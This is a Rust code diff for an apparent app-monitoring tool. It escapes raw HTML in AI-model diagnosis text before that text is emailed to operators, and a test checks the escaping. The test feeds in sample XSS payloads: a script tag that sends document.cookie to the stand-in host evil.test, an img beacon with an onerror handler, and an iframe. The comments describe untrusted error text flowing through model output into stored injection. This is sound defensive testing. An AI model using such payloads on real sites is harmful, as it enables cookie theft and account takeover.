@@ -164,13 +164,23 @@ fn render_act_html(a: &ActOutcome) -> String {
     )
 }
 
+/// Markdown → HTML with raw HTML **neutralised**. The text here is model output, and the model was
+/// fed untrusted error strings from the monitored app: a `<script>`, an `<img src=…>` beacon or a
+/// tracking pixel that survives into an operator's inbox is a stored injection wearing a diagnosis
+/// costume. pulldown-cmark passes `Html`/`InlineHtml` events through verbatim by default, so each is
+/// downgraded to text — it renders as the literal characters the model wrote, which is also the
+/// honest rendering of what it said.
 fn md_to_html(md: &str) -> String {
-    let mut opts = pulldown_cmark::Options::empty();
-    opts.insert(pulldown_cmark::Options::ENABLE_TABLES);
-    opts.insert(pulldown_cmark::Options::ENABLE_STRIKETHROUGH);
-    let parser = pulldown_cmark::Parser::new_ext(md, opts);
+    use pulldown_cmark::{html, Event, Options, Parser};
+    let mut opts = Options::empty();
+    opts.insert(Options::ENABLE_TABLES);
+    opts.insert(Options::ENABLE_STRIKETHROUGH);
+    let parser = Parser::new_ext(md, opts).map(|ev| match ev {
+        Event::Html(raw) | Event::InlineHtml(raw) => Event::Text(raw),
+        other => other,
+    });
     let mut out = String::new();
-    pulldown_cmark::html::push_html(&mut out, parser);
+    html::push_html(&mut out, parser);
     out
 }
 
@@ -212,5 +222,45 @@ mod tests {
         if let Ok(p) = std::env::var("RESPONDER_HTML_DUMP") {
             std::fs::write(p, &html).unwrap();
         }
+    }
+
+    /// The diagnosis is model output seeded with untrusted error text. Raw HTML inside it must reach
+    /// the operator's mail client as characters, never as markup — a block-level tag, an inline tag
+    /// and an event handler are the three shapes that matter.
+    #[test]
+    fn raw_html_in_the_diagnosis_is_neutralised_not_rendered() {
+        let diag = ClaudeRun {
+            text: "Root cause: <script>fetch('https://evil.test/'+document.cookie)</script>\n\n\
+                   See <img src=\"https://evil.test/pixel.gif\" onerror=\"alert(1)\"> the handler.\n\n\
+                   <div onclick=\"x()\">block</div>\n\nSafe `code` stays *emphasised*."
+                .into(),
+            model: "m".into(),
+            cost_usd: None,
+            ok: true,
+        };
+        let html = render_html("p", "t", "error", "d", &diag, None);
+        // No raw tag may open. As text, `&lt;img …&gt;` still *contains* `onerror=`, which is fine:
+        // a mail client renders the characters, not an element with a handler.
+        for forbidden in ["<script", "<img", "<div onclick"] {
+            assert!(!html.contains(forbidden), "{forbidden} leaked: {html}");
+        }
+        for escaped in ["&lt;script&gt;", "&lt;img src=", "&lt;div onclick="] {
+            assert!(
+                html.contains(escaped),
+                "{escaped} should survive as text: {html}"
+            );
+        }
+        assert!(html.contains("<code>code</code>") && html.contains("<em>emphasised</em>"));
+        // The same path renders the auto-fix notes, which are model output too.
+        let act = ActOutcome {
+            skipped_reason: None,
+            branch: Some("lt-fix/p".into()),
+            applied: true,
+            tests: Some(true),
+            notes: "<iframe src=\"https://evil.test\"></iframe>".into(),
+            cost_usd: None,
+        };
+        let html = render_html("p", "t", "error", "d", &diag, Some(&act));
+        assert!(!html.contains("<iframe"), "{html}");
     }
 }
